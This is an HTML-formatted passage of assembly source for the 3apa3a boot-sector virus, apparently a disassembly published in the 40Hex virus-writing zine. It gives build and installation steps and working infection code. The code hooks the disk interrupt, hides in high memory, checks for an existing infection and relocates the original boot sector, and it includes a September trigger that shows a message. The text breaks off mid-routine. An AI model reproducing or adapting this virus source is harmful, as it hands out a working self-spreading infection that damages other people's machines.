<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; To assemble, simple run TASM and TLINK on this file and generate a binary.</span><span class="sc0">
</span><span class="sc1">; The first 512d bytes of the binary will contain the portion of the virus</span><span class="sc0">
</span><span class="sc1">; which resides in IO.SYS. The second 512d bytes will contain the boot</span><span class="sc0">
</span><span class="sc1">; section portion of the virus.</span><span class="sc0">

</span><span class="sc1">; Installation is slightly more difficult. It requires you to simulate</span><span class="sc0">
</span><span class="sc1">; an infection with 3apa3a. Read the text above for information. Basically,</span><span class="sc0">
</span><span class="sc1">; you have to fill in the BPB in the boot sector, fill in the patch values,</span><span class="sc0">
</span><span class="sc1">; and then move the pieces onto the disk properly.</span><span class="sc0">

                </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
                </span><span class="sc9">.code</span><span class="sc0">
                </span><span class="sc9">.radix</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; 3apa3a virus</span><span class="sc0">
</span><span class="sc1">; Disassembly by Dark Angel of Phalcon/Skism for 40Hex Issue 14</span><span class="sc0">
</span><span class="sc5">zero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_3apa3a</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">doffset</span><span class="sc0">
</span><span class="sc5">doffset</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0EE</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; sub si,4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; get date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1Ah</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; september?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_activate</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">message</span><span class="sc4">-</span><span class="sc5">_3apa3a</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E42</span><span class="sc0">                 </span><span class="sc1">; begin with B</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endmessage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
</span><span class="sc5">display_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">                      </span><span class="sc1">; print character</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; calculate next character</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">display_loop</span><span class="sc0">

</span><span class="sc5">no_activate</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ds = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; es = cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_i13</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">; grab old int 13 handler</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">413</span><span class="sc0">               </span><span class="sc1">; get BIOS memory size</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; decrease by 2K</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">413</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; replace the value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; convert to paragraphs</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; replace interrupt handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i13</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; move ourselves up</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; copy now!</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">                      </span><span class="sc1">; cx = 1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">                  </span><span class="sc1">; copy rest</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">highentry</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">highentry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7C0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">200</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">202</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">203</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">3C2</span><span class="sc4">,</span><span class="sc2">0FCF0</span><span class="sc0">   </span><span class="sc1">; patch work_on_sectors to call</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">work_on_sectors</span><span class="sc0">         </span><span class="sc1">; do_i13</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">message</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'B'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'B'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'O'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'B'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'O'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'T'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'K'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'T'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'O'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'T'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'P'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'-'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'3'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'P'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'P'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'3'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'3'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'!'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">7</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'!'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
</span><span class="sc5">endmessage</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">do_i13</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">200</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">202</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">patch</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">  </span><span class="sc1">; jmp absolute</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">; do interrupt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">patch</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc0">    </span><span class="sc1">; jnz</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">retry_error</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">retry_error</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">; first hard drive?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_i13</span><span class="sc0">                  </span><span class="sc1">; if so, retry</span><span class="sc0">
</span><span class="sc5">go_exit_i13</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_i13</span><span class="sc0">                </span><span class="sc1">; otherwise quit</span><span class="sc0">

</span><span class="sc5">i13</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">; hard drive?</span><span class="sc0">
</span><span class="sc5">patch</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_exit_i13</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; check if working on</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; boot sector or</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; partition table</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">go_exit_i13</span><span class="sc0">             </span><span class="sc1">; if not, quit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">; get our current segment</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">; move up 200 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">200</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">     </span><span class="sc1">; set function to read</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">202</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">; set drive to hard drive</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">400</span><span class="sc0">                  </span><span class="sc1">; set buffer</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; read in the boot sector</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_i13</span><span class="sc0">                  </span><span class="sc1">; read in boot sector</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">400</span><span class="sc4">+</span><span class="sc2">21</span><span class="sc4">,</span><span class="sc2">2E</span><span class="sc0">   </span><span class="sc1">; check if 3apa3a already there</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_exit_i13</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">400</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">go_exit_i13</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">203</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">403</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc0">                  </span><span class="sc1">; copy disk tables</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">                  </span><span class="sc1">; copy the rest</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1E2</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">201</span><span class="sc0">         </span><span class="sc1">; set to write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">16</span><span class="sc0">                </span><span class="sc1">; get sectors per FAT</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">10</span><span class="sc0">          </span><span class="sc1">; multiply by # FATs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">11</span><span class="sc0">                </span><span class="sc1">; get number of sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; occupied by the root</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; directory</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; cmp bx,5    ; at least five?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">go_exit_i13</span><span class="sc0">             </span><span class="sc1">; if not, quit</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0E</span><span class="sc0">                </span><span class="sc1">; add # reserved sectors</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; drop two sectors to find</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; start of last sector</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; of root directory</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">abs_sec_to_BIOS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">patch1</span><span class="sc4">-</span><span class="sc2">200</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">        </span><span class="sc1">; move original boot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">patch2</span><span class="sc4">-</span><span class="sc2">200</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">        </span><span class="sc1">; sector to the end of the</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; root directory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_i13</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">abs_sec_to_BIOS</span><span class="sc0">

